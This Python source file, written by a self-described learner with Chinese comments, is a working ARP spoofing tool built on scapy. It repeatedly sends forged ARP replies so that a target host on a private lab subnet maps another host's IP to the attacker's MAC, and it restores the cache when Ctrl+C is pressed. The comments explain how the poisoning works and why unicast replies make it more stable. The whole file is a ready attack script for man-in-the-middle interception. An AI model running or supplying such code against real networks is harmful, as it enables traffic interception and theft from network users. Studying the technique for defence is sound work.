#!/usr/bin/env python3
# -*- encoding = utf-8 -*-
# 该代码由本人学习时编写，仅供自娱自乐！
# 本人QQ：1945962391 
# 欢迎留言讨论，共同学习进步！

import sys
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
from Tools import GET_IP_netifaces
from Tools import GET_MAC_netifaces
from ARP import ARP_Request
from Tools.Scapy_IFACE import scapy_iface
import time
import signal


def arp_spoof(dst, src, ifname):  # 定义毒化方法，毒化dst，使dst相信src的mac地址是本机的mac地址
    global psrc, hwsrc, mac_src, hwdst, src1, dst1, ifname1  # 声明全局变量，为后续函数使用方便
    src1 = src  # 为全局变量赋值，src1为被毒化主机地址
    dst1 = dst  # dst1为被攻击对象的主机地址
    ifname1 = ifname  # 攻击使用的接口名字
    psrc = GET_IP_netifaces.get_ip_address(ifname)  # 通过之前编写的方法获取本地ip地址
    hwsrc = GET_MAC_netifaces.get_mac_address(ifname)  # 获取本地mac地址
    mac_src = ARP_Request.arp_request(dst, ifname)[-1]  # 获取被攻击主机的真实mac地址
    hwdst = ARP_Request.arp_request(src, ifname)[-1]  # 获取被毒化主机的真实mac地址
    signal.signal(signal.SIGINT, sigint_handler)  # 信号处理，接收到ctrl+c后执行sigint_handler方法
    while True:
        sendp(Ether(src=hwsrc, dst=mac_src) / ARP(op=2, hwsrc=hwsrc, psrc=src1, hwdst=mac_src, pdst=dst1),
              iface=scapy_iface(ifname1), verbose=False)
        # sendp方法发送二层数据包，源mac地址为本地mac，目的地址为被攻击主机的mac地址，arp数据包中，选项为2（reply），
        # 源mac地址为本地mac地址，源ip地址为被毒化主机的ip地址，起到毒化效果，目的mac地址与目的ip地址均为被攻击主机mac及ip地址
        # 如果采用dst为二层广播，会造成被伪装设备告警地址重叠(免费arp的效果)，并且欺骗效果不稳定，容易抖动！
    # pkt.show()
        print("发送ARP欺骗数据包！欺骗" + dst + ',本机MAC地址为' + hwsrc + '的MAC地址！！！')
        time.sleep(1)


def sigint_handler(signum, frame):  # 定义处理方法
    global psrc, hwsrc, mac_src, hwdst, src1, dst1  # 引入全局变量
    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=hwsrc, dst=mac_src) / ARP(op=2, hwsrc=hwdst, hwdst=mac_src, psrc=src1, pdst=dst1),
          iface=scapy_iface(ifname1),
          verbose=False)
    time.sleep(1)
    print("已经恢复 " + src1 + " ARP缓存")
    # 退出程序，跳出while True
    sys.exit()


if __name__ == "__main__":
    arp_spoof('192.168.98.129', '192.168.98.128', 'ens33')  # 攻击192.168.98.129主机，使其相信192.168.98.128的mac地址为本机的mac地址

